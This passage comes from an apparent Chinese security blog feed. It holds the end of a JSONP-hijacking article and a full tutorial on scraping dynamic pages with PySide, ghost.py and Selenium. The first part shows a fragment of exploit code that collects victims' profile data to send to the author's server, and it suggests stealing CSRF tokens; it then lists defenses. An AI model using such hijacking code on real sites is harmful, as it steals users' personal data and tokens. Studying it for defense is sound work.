&quot;&amp;amp;&quot;;    post_data += &quot;screen_name=&quot; + screen_name + &quot;&amp;amp;&quot;;    post_data += &quot;profile_image_url=&quot; + encodeURIComponent(profile_image_url);    console.log(post_data);    // 发送到我的服务器上}).fail(function() {});</code></pre><p>这样就能收到大量用户的敏感信息了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%957.png" alt="此处输入图片的描述"></p><p>上述相关代码被一个师傅放在了 github 上，<a href="https://github.com/qiaofei32/jsonp_info_leak" target="_blank" rel="noopener">地址</a></p><h3 id="2-相关扩展"><a href="#2-相关扩展" class="headerlink" title="2.相关扩展"></a><strong>2.相关扩展</strong></h3><p>(1)既然是窃取敏感信息，那么敏感信息除了一些 email 手机号 用户名等还有什么呢？没错，甚至可以是 CSRF Token 信息，有时候在 CSRF token 获取不到但是又找不到 XSS 的攻击点的时候不妨考虑一下 jsonp 劫持,看看会不会有惊喜</p><p>(2)还有一点，你有没有觉得这个攻击方式有点类似于 CSRF ，是的，的确很像，因此这也就引出了非常类似的修复方案。</p><h2 id="0X05-防护方案"><a href="#0X05-防护方案" class="headerlink" title="0X05 防护方案"></a><strong>0X05 防护方案</strong></h2><p>1、严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。<br>2、严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。<br>3、严格过滤 callback 函数名及 JSON 里数据的输出。<br>4、严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。<br>5、其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。</p><h2 id="0X06-参考链接"><a href="#0X06-参考链接" class="headerlink" title="0X06 参考链接"></a><strong>0X06 参考链接</strong></h2><p><a href="http://www.mottoin.com/tech/123337.html" target="_blank" rel="noopener">http://www.mottoin.com/tech/123337.html</a><br><a href="https://www.anquanke.com/post/id/97671" target="_blank" rel="noopener">https://www.anquanke.com/post/id/97671</a><br><a href="https://xiaix.me/fan-yi-wa-jue-tong-yuan-fang-fa-zhi-xing-lou-dong-same-origin-method-execution/" target="_blank" rel="noopener">https://xiaix.me/fan-yi-wa-jue-tong-yuan-fang-fa-zhi-xing-lou-dong-same-origin-method-execution/</a><br><a href="https://wooyun.js.org/drops/JS%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%9A%E4%B8%8D%E5%AE%B9%E5%BF%BD%E8%A7%86%E7%9A%84WEB%E6%BC%8F%E6%B4%9E.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/JS%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%9A%E4%B8%8D%E5%AE%B9%E5%BF%BD%E8%A7%86%E7%9A%84WEB%E6%BC%8F%E6%B4%9E.html</a><br><a href="https://www.infosec-wiki.com/?p=455211" target="_blank" rel="noopener">https://www.infosec-wiki.com/?p=455211</a><br><a href="https://www.cnblogs.com/52php/p/5677775.html" target="_blank" rel="noopener">https://www.cnblogs.com/52php/p/5677775.html</a><br><a href="http://www.91ri.org/13407.html" target="_blank" rel="noopener">http://www.91ri.org/13407.html</a><br><a href="https://www.freebuf.com/articles/web/70025.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/70025.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X00 前言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;最近打算看一些前端方面的东西，琢磨着从哪里开始看起，正好想到之前我还有一篇 &lt;a href=&quot;https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/&quot;&gt;由浅入深理解 jsonp 并拓展&lt;/a&gt; 这样的文章，主要介绍的是 jsonp 的概念，利用思路还没有讲，于是干脆就接着写这个话题吧。&lt;/p&gt;
&lt;h2 id=&quot;0X01-什么是-JSONP-劫持&quot;&gt;&lt;a href=&quot;#0X01-什么是-JSONP-劫持&quot; class=&quot;headerlink&quot; title=&quot;0X01 什么是 JSONP 劫持&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X01 什么是 JSONP 劫持&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;由于之前的那篇文章已经详细介绍过 jsonp 的工作原理，所以这里就不再详细介绍原理了，就简单的说一下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JSONP&lt;/strong&gt; 就是为了跨域&lt;strong&gt;获取资源&lt;/strong&gt;而产生的一种&lt;strong&gt;非官方&lt;/strong&gt;的技术手段(官方的有 CORS 和 postMessage),它利用的是 script 标签的 src 属性不受同源策略影响的特性，&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://www.k0rz3n.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="前端" scheme="https://www.k0rz3n.com/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>爬虫爬取动态网页的三种方式简介</title>
    <link href="https://www.k0rz3n.com/2019/03/05/%E7%88%AC%E8%99%AB%E7%88%AC%E5%8F%96%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%E7%AE%80%E4%BB%8B/"/>
    <id>https://www.k0rz3n.com/2019/03/05/爬虫爬取动态网页的三种方式简介/</id>
    <published>2019-03-05T07:02:18.000Z</published>
    <updated>2019-04-28T14:10:09.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong>0x00 前言</strong></h2><p>最近在看类似的问题的时候找了一些资料，发现网上有一篇文章写得很详细(准确的说是分成三篇文章写的)，特别是手工逆向的方式还是挺有趣的，我也照着他的方式尝试了一下，学到一点东西，下面是这三篇文章的部分内容(有删改，外加其它的一些理解),如果想看原文的话，我在本文最后会附上原文的链接，至于目前最流行的使用  chrome headless 写动态爬虫的方法，由于原作者写的也不是很仔细，所以我还要再找些资料仔细研究一下，后面再写一篇文章总结。</p><h2 id="0X01-动态网页简介："><a href="#0X01-动态网页简介：" class="headerlink" title="0X01 动态网页简介："></a><strong>0X01 动态网页简介：</strong></h2><p>在我们编写爬虫时，可能会碰到以下两种问题：</p><a id="more"></a><p>1.我们所需要爬取的数据在网页源代码中并不存在；<br>2.点击下一页跳转页面时，网页的 URL 并没有发生变化；</p><p>造成这种问题原因是，你所正在爬取的页面采取了 js 动态加载的方式，是一个动态网页。</p><p>所谓的动态网页，是指跟静态网页相对的一种网页编程技术。静态网页，随着html代码生成，页面的内容和显示效果就不会发生变化了。而动态网页则不然，其显示的页面则是经过Javascript处理数据后生成的结果，可以发生改变。<strong>这些数据的来源有多种，可能是经过Javascript计算生成的，也可能是通过Ajax加载的。</strong></p><p>动态网页经常使用的一种技术是Ajax请求技术。</p><blockquote><p>Ajax = Asynchronous JavaScript and XML（异步的 JavaScript 和XML），其最大的优点是在<strong>不重新加载整个页面的情况下</strong>，可以与服务器交换数据并更新部分网页的内容。</p></blockquote><p>目前，越来越多的网站采取的是这种动态加载网页的方式，一来是可以实现web开发的前后端分离，减少服务器直接渲染页面的压力；<strong>二来是可以作为反爬虫的一种手段。</strong></p><h2 id="0X02-动态网页抓取"><a href="#0X02-动态网页抓取" class="headerlink" title="0X02 动态网页抓取"></a><strong>0X02 动态网页抓取</strong></h2><h3 id="1-逆向回溯法"><a href="#1-逆向回溯法" class="headerlink" title="(1)逆向回溯法"></a><strong>(1)逆向回溯法</strong></h3><p>对于动态加载的网页，我们想要获取其网页数据，<strong>需要了解网页是如何加载数据的</strong>，该过程就被成为逆向回溯。</p><p>对于使用了Ajax 请求技术的网页，我们可以找到Ajax请求的具体链接，直接得到Ajax请求得到的数据。</p><blockquote><p><strong>需要注意的是，构造Ajax请求有两种方式：</strong></p><p><strong>1.原生的Ajax请求：</strong>会直接创建一个XMLHTTPRequest对象。<br><strong>2.调用jQuery的ajax()方法：</strong>一般情况下，<code>$.ajax()</code>会返回其创建的XMLHTTPRequest对象；但是，如果<code>$.ajax()</code>的dataType参数指定了为script或jsonp类型，<code>$.ajax()</code>不再返回其创建的XMLHTTPRequest对象。</p></blockquote><p>对于这两种方式，只要创建并返回了XMLHTTPRequest对象，就可以通过Chrome浏览器的调试工具在NetWork窗口设置过滤条件为 xhr ，直接筛选出Ajax请求的链接；如果是$.ajax()并且dataType指定了为script或jsonp<strong>(这种情况下NetWork 里面的 Type 都是 script，如果你懂得 jsonp 的原理的话就知道 jsonp 本质就是通过 script)</strong>，则无法通过这种方式筛选出来<strong>(因为这两种方式是经典的跨域方法，而 XHR 是不能跨域的，所以设置 XHR 过滤)</strong>。</p><h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a><strong>示例：</strong></h4><p>接下来以 <a href="http://book.sina.com.cn/excerpt/" target="_blank" rel="noopener">新浪读书——书摘</a> 为例，介绍如何得到无法筛选出来的Ajax请求链接:</p><p>在Chrome中打开网页，右键检查，会发现首页中书摘列表包含在一个id为subShowContent1_static的div中，而查看网页源代码会发现id为subShowContent1_static的div为空。</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%861.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%862.png" alt="此处输入图片的描述"></p><p>并且点击更多书摘或下一页时，网页URL并没有发生变化。</p><p>这与我们最前面所说的两种情况相同，说明这个网页就是使用 JS 动态加载数据的。</p><p>F12打开调试工具，打开NetWork窗口，F5刷新，可以看到浏览器发送以及接收到的数据记录(我们可以点击上面的 XHR 或者 JS 对这些请求进行过滤)：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%863.png" alt="此处输入图片的描述"></p><p>可以发现目前两种类型的请求都是存在的，暂时还不能判断我们 <strong>div 中内容</strong>的动态加载使用的是哪一种方式，不过没关系，我们可以进一步进行测试。</p><h5 id="1-根据-id-进行查找"><a href="#1-根据-id-进行查找" class="headerlink" title="1.根据 id 进行查找"></a><strong>1.根据 id 进行查找</strong></h5><p>我们知道,js 操作页面的数据一定要进行定位，最常用的方法就是使用 id 定位，因为 id 在整个页面中是唯一的，那么我们第一步就是在所有的 js 文件中找和 subShowContent1_static 这个 id 相关的文件，于是我在 network 页面使用 ctrl+f 进行全局搜索</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%864.png" alt="此处输入图片的描述"></p><p>最终定位到了可能性最大的文件 feedlist.js</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%865.png" alt="此处输入图片的描述"></p><p>进入这个文件以后我就定位到了一个匿名函数 $(),这个函数将参数传入 Listmore() 函数</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%866.png" alt="此处输入图片的描述"></p><p>listmore() 函数调用了 Getmorelist() 函数</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%867.png" alt="此处输入图片的描述"></p><p>Getmorelist() 函数 调用了 getMore() 函数</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%868.png" alt="此处输入图片的描述"></p><p>getmore() 函数定义了我们的请求</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%869.png" alt="此处输入图片的描述"></p><h5 id="2-设置断点进行动态捕获"><a href="#2-设置断点进行动态捕获" class="headerlink" title="2.设置断点进行动态捕获"></a><strong>2.设置断点进行动态捕获</strong></h5><p>可以看到这里使用的是 jsonp 的形式跨域传递数据的，然后 URL 是一个对象，是运行中生成的，我们可以在运行中对这个函数添加一个断点</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%8610.png" alt="此处输入图片的描述"></p><p>然后 f5 刷新</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%8611.png" alt="此处输入图片的描述"></p><p>断下来以后就能看到我们想要看到的 URL 以及后面跟着的参数了，这样就可以根据jQuery的ajax()用法构造正确的Ajax 请求链接：</p><pre><code>http://feed.mix.sina.com.cn/api/roll/get?callback=xxxxxxxx&amp;pageid=96&amp;lid=560&amp;num=20&amp;page=1</code></pre><p>那么这个 callback 是多少呢，我们现在还看不出来，但是，既然这个是一个请求，那么肯定会在 network 中有记录，我们找找看</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%8612.png" alt="此处输入图片的描述"></p><p>我们现在就锁定了我们想要找的链接，得到Ajax请求链接之后，可以直接得到请求的数据，一般为json格式，处理后即可使用。</p><blockquote><p><strong>注：</strong></p><p>其实当你有了经验之后，对一些不是很复杂的网页，根本就不用进行这么复杂的逆向工程，凭URL形式可以很快的在NetWork窗口 选择-验证 出所需的Ajax请求。</p></blockquote><h3 id="2-渲染动态网页法"><a href="#2-渲染动态网页法" class="headerlink" title="(2)渲染动态网页法"></a><strong>(2)渲染动态网页法</strong></h3><h4 id="1-浏览器渲染引擎："><a href="#1-浏览器渲染引擎：" class="headerlink" title="1.浏览器渲染引擎："></a><strong>1.浏览器渲染引擎：</strong></h4><h5 id="1-简介："><a href="#1-简介：" class="headerlink" title="(1)简介："></a><strong>(1)简介：</strong></h5><p>在介绍这种方式之前，我们需要首先了解一些浏览器渲染引擎的基本知识。</p><p>渲染引擎的职责就是渲染，即在浏览器窗口中显示所请求的内容。浏览器向服务器发送请求，得到服务器返回的资源文件后，需要经过渲染引擎的处理，将资源文件显示在浏览器窗口中。</p><p><strong>目前使用较为广泛的渲染引擎有两种：</strong></p><pre><code>webkit——使用者有Chrome, SafariGeoko——使用者有Firefox</code></pre><h5 id="2-渲染主流程："><a href="#2-渲染主流程：" class="headerlink" title="(2)渲染主流程："></a><strong>(2)渲染主流程：</strong></h5><p>渲染引擎首先通过网络获得所请求文档的内容，通常以8K分块的方式完成。</p><p><strong>下面是渲染引擎在取得内容之后的基本流程：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%81%97%E6%BC%8F%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%8613.png" alt="此处输入图片的描述"></p><blockquote><p>解析html来构建dom树 -&gt; 构建render树 -&gt; 布局render树 -&gt; 绘制render树</p></blockquote><ul><li><p>渲染引擎开始解析html，并将标签转化为内容树中的dom节点<strong>。如果遇到JS，那么此时会启用另外的连接进行下载(下载过程中 dom 树的构建不会停止)，并且在下载完成后立即执行(执行过程中会阻塞 浏览器的其他行为，因为 js 的运行可能会改变 dom 树的结构，为了不让刚刚构建好的 dom 树又被 js 改变，聪明的浏览器停止了 dom 树的构建)。</strong></p></li><li><p>接着，它解析外部CSS文件及style标签中的样式信息。这些样式信息以及html中的可见性指令将被用来构建另一棵树——render树(其实这一步是和上一步同时进行的，为了页面显示更迅速，css 不会等到 dom 树构建完毕才开始构建 render树 )。</p></li><li><p>Render树由一些包含有颜色和大小等属性的矩形组成，它们将被按照正确的顺序显示到屏幕上。</p></li><li><p>Render树构建好了之后，将会执行布局过程，它将确定每个节点在屏幕上的确切坐标。</p></li><li><p>再下一步就是绘制，即遍历render树，并使用UI后端层绘制每个节点。</p></li></ul><blockquote><p><strong>补充知识：</strong></p><p><strong>1.浏览器会解析三个东西：</strong> </p><p>（1） HTML/SVG/XHTML，解析这三种文件会产生一个 DOM Tree。<br>（2） CSS，解析 CSS 会产生 CSS 规则树(CSSOM)。<br>（3） Javascript脚本，主要是通过 DOM API 和 CSSOM API 来操作 DOM Tree 和 CSS Rule Tree.</p><p><strong>2.形象的HTML页面加载和解析流程:</strong></p><ol><li>用户输入网址（假设是个html页面，并且是第一次访问），浏览器向服务器发出请求，服务器返回html文件</li><li>浏览器开始载入html代码，发现＜head＞标签内有一个＜link＞标签引用外部CSS文件； </li><li>浏览器又发出CSS文件的请求，服务器返回这个CSS文件； </li><li>浏览器继续载入html中＜body＞部分的代码，并且CSS文件已经拿到手了，可以开始渲染页面了； </li><li>浏览器在代码中发现一个＜img＞标签引用了一张图片，向服务器发出请求。此时浏览器不会等到图片下载完，而是继续渲染后面的代码； </li><li>服务器返回图片文件，由于图片占用了一定面积，影响了后面段落的排布，因此浏览器需要回过头来重新渲染这部分代码； </li><li>浏览器发现了一个包含一行Javascript代码的＜script＞标签，赶快运行它； </li><li>Javascript脚本执行了这条语句，它命令浏览器隐藏掉代码中的某个＜div＞ （style.display=”none”）。突然少了这么一个元素，浏览器不得不重新渲染这部分代码； </li><li>终于等到了＜/html＞的到来，浏览器泪流满面…… </li><li>等等，还没完，用户点了一下界面中的“换肤”按钮，Javascript让浏览器换了一下＜link＞标签的CSS路径</li><li>浏览器召集了在座的各位＜div＞＜span＞＜ul＞＜li＞们，“大伙儿收拾收拾行李，咱得重新来过……”，浏览器向服务器请求了新的CSS文件，重新渲染页面。</li></ol><p><strong>3.Javascript的加载和执行的特点：</strong> </p><p>(1)载入后马上执行；<br>(2)执行时会阻塞页面后续的内容（包括页面的渲染、其它资源的下载）。原因：因为浏览器需要一个稳定的DOM树结构，而JS中很有可能有代码直接改变了DOM树结构，比如使用 document.write 或appendChild,甚至是直接使用的location.href进行跳转，浏览器为了防止出现JS修改DOM树，需要重新构建DOM树的情况，所以就会阻塞其他的下载和呈现。</p></blockquote><h5 id="3-思考："><a href="#3-思考：" class="headerlink" title="(3)思考："></a><strong>(3)思考：</strong></h5><blockquote><p><strong>了解了浏览器渲染引擎的基本原理，我们可以发现：</strong></p><p>当浏览器渲染引擎完成了dom树以及render树的构建之后，树中就已经包含了我们在浏览器窗口中可以看到的所有数据。</p></blockquote><p>那么我们就有了一种爬取动态网页的<strong>新思路：</strong></p><p>在浏览器渲染引擎执行layout以及printing之前，得到dom树或者render树，从树中获取动态加载的数据。</p><h4 id="2-渲染动态网页："><a href="#2-渲染动态网页：" class="headerlink" title="2.渲染动态网页："></a><strong>2.渲染动态网页：</strong></h4><h5 id="1-有两种选择："><a href="#1-有两种选择：" class="headerlink" title="(1)有两种选择："></a><strong>(1)有两种选择：</strong></h5><p>1.自己从头实现一个浏览器渲染引擎，在合适的时机返回构建的dom树或render树：这需要进行大量的工作，需要考虑html、js、css等不同格式文件的解析方式以及解析顺序等。</p><p>2.接下来将使用WebKit 渲染引擎，通过 <a href="http://pyside.github.io/docs/pyside/" target="_blank" rel="noopener">PySide</a> 这个python库可以获得该引擎的一个便捷接口。</p><p>由于相当于第一种方法来说，第二种方法稍微简单一些，于是这里以第二种为例</p><h5 id="2-示例："><a href="#2-示例：" class="headerlink" title="(2)示例："></a><strong>(2)示例：</strong></h5><p>还是以 <a href="http://book.sina.com.cn/excerpt/" target="_blank" rel="noopener">新浪读书——书摘</a> 为例，可以发现：页面中文章列表的部分是动态加载的。</p><p>使用PySide库进行处理的示例代码如下：</p><pre><code>#coding=utf-8from PySide.QtGui import *from PySide.QtCore import *from PySide.QtWebKit import *if __name__ == &apos;__main__&apos;:    url = &quot;http://book.sina.com.cn/excerpt/rwws/&quot;    app = QApplication([])  # 完成其他Qt对象之前，必须先创建该对象    webview = QWebView()  # 该对象是Web 对象的容器    # 调用show方法显示窗口    # webview.show()    # 设置循环事件， 并等待网页加载完成    loop = QEventLoop()    webview.loadFinished.connect(loop.quit)    webview.load(QUrl(url))    loop.exec_()    frame = webview.page().mainFrame()  # QWebFrame类有很多与网页交互的有用方法    # 得到页面渲染后的html代码    html = frame.toHtml()    print html</code></pre><p>通过print语句，我们可以发现：页面的源码html中已经包含了动态加载的内容。</p><p><strong>与网站交互：</strong></p><p>得到动态加载的内容后，需要解决的另一个问题是翻页问题。还好PySide库的QWebKit模块还有一个名为QWebFrame的类，支持很多与网页的交互操作。</p><p><strong>如“点击”：</strong></p><pre><code>#根据CSS Selector 找到所需“进行翻页”的元素elem = frame.findFirstElement(&apos;#subShowContent1_loadMore&apos;)# 点击：通过evaluateJavaScript()函数可以执行Js代码elem.evaluateJavaScript(&apos;this.click()&apos;)</code></pre><p>除了点击事件，还可以进行填充表单，滚动窗口等操作</p><blockquote><p>需要注意的是，在进行了翻页、或者获取更多内容时，一个最大的难点在于如何确定页面是否完成了加载，因为我们难以估计Ajax事件或者Js准备数据的时间。</p></blockquote><p><strong>对于这个问题有两种解决思路：</strong></p><p>(1)等待固定的一段时间，比如time.sleep(3)：这种方法容易实现，但效率较低。</p><p>(2)轮询网页，等待特定内容出现：这种方法虽然会在检查是否加载完成时浪费CPU周期，但更加可靠。</p><p><strong>以下是一个简单的实现：</strong></p><pre><code>elem = Nonewhile not elem: app.processEvents() elem = frame.findAllElemnets(&apos;#pattern&apos;)</code></pre><p>代码循环，直到出现特定元素。每次循环，调用app.processEvents()方法，用于给Qt事件循环执行任务的时间，比如响应点击事件。</p><p>但是PySide毕竟是一个为了Python的GUI 编程而开发的， 其功能对于爬虫来说实在是太过于庞大，所以我们可以把爬虫经常使用的功能进行封装，来提升编写爬虫的效率。</p><h5 id="3-对PySide-常用功能的封装-——-ghost-py"><a href="#3-对PySide-常用功能的封装-——-ghost-py" class="headerlink" title="(3)对PySide 常用功能的封装 —— ghost.py"></a><strong>(3)对PySide 常用功能的封装 —— ghost.py</strong></h5><p><a href="https://ghost-py.readthedocs.io/en/latest/#" target="_blank" rel="noopener">ghost.py</a> 是目前一个针对爬虫且功能比较完善的PySide的封装模块，使用它可以很方便的进行数据采集。</p><p>还是以获取列表页中每篇文章详情页地址为目标，</p><h6 id="1-示例代码："><a href="#1-示例代码：" class="headerlink" title="1.示例代码："></a><strong>1.示例代码：</strong></h6><pre><code># coding=utf-8import reimport timefrom ghost import Ghost, Sessionclass SinaBookSpider(object):    # 初始化相关参数    gh = Ghost()    ss = Session(gh, display=True)  # 设置display为true, 方便调试    total = 1526  # 预先计算的总数据量    count = 0  # 已爬取的数据量    # 记录解析以及翻页位置    location = 0    click_times = 0    def run(self):        &quot;&quot;&quot;        开始爬虫        :return:        &quot;&quot;&quot;        # 打开网页        self.ss.open(&quot;http://book.sina.com.cn/excerpt/rwws/&quot;)        # 等待数据加载完成        self.ss.wait_for_selector(&apos;#subShowContent1_static &gt; div:nth-child(20)&apos;)        self.parselist()        while self.count &lt; self.total:            if self.click_times is 0:                # 点击加载更多                self.ss.click(&apos;#subShowContent1_loadMore&apos;)                # 每次翻页，或加载更多，要等待至加载完成                self.ss.wait_for_selector(&apos;#subShowContent1_static &gt; div:nth-child(21)&apos;)                self.click_times += 1                self.parselist()            elif self.click_times is 1:                self.ss.click(&apos;#subShowContent1_loadMore&apos;)                self.ss.wait_for_selector(&apos;#subShowContent1_static &gt; div:nth-child(41)&apos;)                self.click_times += 1                self.parselist()            elif self.click_times is 2:                self.ss.click(&apos;#subShowContent1_page .pagebox_next a&apos;)                self.ss.sleep(2)                self.click_times = 0                self.location = 0                self.parselist()    def parselist(self):        &quot;&quot;&quot;        解析列表页        :return:        &quot;&quot;&quot;        html = self.ss.content.encode(&apos;utf8&apos;)        # print html        pattern = re.compile(r&apos;&lt;div class=&quot;item&quot;&gt;&lt;h4&gt;&lt;a href=&quot;(.*?)&quot; target=&quot;_blank&quot;&gt;&apos;, re.M)        links = pattern.findall(html)        for i in range(self.location, len(links)):            print links[i]            self.count += 1            self.location += 1        print self.countif __name__ == &apos;__main__&apos;:    spider = SinaBookSpider()    spider.run()</code></pre><h6 id="2-代码地址："><a href="#2-代码地址：" class="headerlink" title="2.代码地址："></a><strong>2.代码地址：</strong></h6><p><a href="https://github.com/linbo-lin/dynamic-web-process" target="_blank" rel="noopener">https://github.com/linbo-lin/dynamic-web-process</a></p><h6 id="3-补充："><a href="#3-补充：" class="headerlink" title="3.补充："></a><strong>3.补充：</strong></h6><p>ghost.py对直接获取元素支持的不是很好，但可以借助BeautifulSoup或正则表达式来解决。</p><p>ghost.py支持与网页的简单交互，如点击，填充表单等</p><ul><li>set_field_value(*args, **kwargs)</li><li>fill(*args, **kwargs)</li><li>click(*args, **kwargs)</li></ul><p>ghost.py很好的解决了确定元素加载完成的问题，通过以下方法可以让爬虫等待，直到满足设置的条件。</p><ul><li>wait_for(condition, timeout_message, timeout=None)</li><li>wait_for_page_loaded(timeout=None)</li><li>wait_for_selector(selector, timeout=None)</li><li>wait_for_text(text, timeout=None)</li><li>wait_while_selector(selector, timeout=None)</li></ul><h3 id="3-模拟浏览器行为法"><a href="#3-模拟浏览器行为法" class="headerlink" title="(3)模拟浏览器行为法"></a><strong>(3)模拟浏览器行为法</strong></h3><p>前面的例子中，我们使用WebKit库，可以自定义浏览器渲染引擎，这样就可以完全控制想要执行的行为。如果不需要那么高的灵活性，那么还有一个不错的替代品 <a href="https://docs.seleniumhq.org/" target="_blank" rel="noopener">Selenium</a> 可以选择，它提供了使浏览器自动化的API 接口。</p><h4 id="1-Selenium-简介："><a href="#1-Selenium-简介：" class="headerlink" title="1.Selenium 简介："></a><strong>1.Selenium 简介：</strong></h4><p>Selenium 是一个用于Web应用程序测试的工具。Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。支持市面上几乎所有的主流浏览器。</p><p>本来打算使用的是selenium + PhantomJS(由于内部 webkit 组件无人维护并且会出现各种各样的问题，所以作者也已经不再维护)的组合，但发现Chrome以及FireFox也相继推出无头 ( headless ) 浏览器模式，个人比较倾向Chrome。本文采用的是Selenium+Chrome的组合。</p><h4 id="2-示例：-1"><a href="#2-示例：-1" class="headerlink" title="2.示例："></a><strong>2.示例：</strong></h4><p><strong>运用到爬虫中的思路是：</strong></p><p>使用Selenium 渲染网页，解析渲染后的网页源码，或者直接通过Selenium 接口获取页面中的元素。<br>还是以 <a href="http://book.sina.com.cn/excerpt/" target="_blank" rel="noopener">新浪读书——书摘</a> 这个网站为例，目标是获取列表中每篇文章详情页的地址</p><p><strong>示例代码：</strong></p><pre><code># coding=utf-8import timefrom selenium import webdriverclass SinaBookSpider(object):    # 创建可见的Chrome浏览器， 方便调试    driver = webdriver.Chrome()    # 创建Chrome的无头浏览器    # opt = webdriver.ChromeOptions()    # opt.set_headless()    # driver = webdriver.Chrome(options=opt)    driver.implicitly_wait(10)    total = 1526  # 预先计算的总数据量    count = 0  # 已爬取的数据量    # 记录解析以及翻页位置    location = 0    click_times = 0    def run(self):        &quot;&quot;&quot;        开始爬虫        :return:        &quot;&quot;&quot;        # get方式打开网页        self.driver.get(&quot;http://book.sina.com.cn/excerpt/rwws/&quot;)        self.parselist()        while self.count &lt; self.total:            if self.click_times is 2:                self.driver.find_element_by_css_selector(&apos;#subShowContent1_page &gt; span:nth-child(6) &gt; a&apos;).click()                # 等待页面加载完成                time.sleep(5)                self.click_times = 0                self.location = 0            else:                self.driver.find_element_by_css_selector(&apos;#subShowContent1_loadMore&apos;).click()                # 等待页面加载完成                time.sleep(3)                self.click_times += 1            # 分析加载的新内容，从location开始            self.parselist()        self.driver.quit()    def parselist(self):        &quot;&quot;&quot;        解析列表        :return:        &quot;&quot;&quot;        divs = self.driver.find_elements_by_class_name(&quot;item&quot;)        for i in range(self.location, len(divs)):            link = divs[i].find_element_by_tag_name(&apos;a&apos;).get_attribute(&quot;href&quot;)            print link            self.location += 1            self.count += 1        print self.countif __name__ == &apos;__main__&apos;:    spider = SinaBookSpider()    spider.run()</code></pre><blockquote><p>代码地址：<a href="https://github.com/linbo-lin/dynamic-web-process" target="_blank" rel="noopener">https://github.com/linbo-lin/dynamic-web-process</a><br>如果你想实际运行上述代码，请在运行之前确定：安装了与浏览器版本对应的驱动，并正确的添加到了环境变量中。</p></blockquote><h4 id="3-使用selenium时同样要特别注意的是如何确定-网页是否加载完成"><a href="#3-使用selenium时同样要特别注意的是如何确定-网页是否加载完成" class="headerlink" title="3.使用selenium时同样要特别注意的是如何确定 网页是否加载完成"></a><strong>3.使用selenium时同样要特别注意的是如何确定 网页是否加载完成</strong></h4><p><strong>有三种方式：</strong></p><p>(1)强制等待<br>(2)隐形等待<br>(3)显性等待</p><p>有关这三种方式的讲解可以看这里：<a href="https://huilansame.github.io/huilansame.github.io/archivers/sleep-implicitlywait-wait" target="_blank" rel="noopener">Python selenium —— 一定要会用selenium的等待，三种等待方式解读 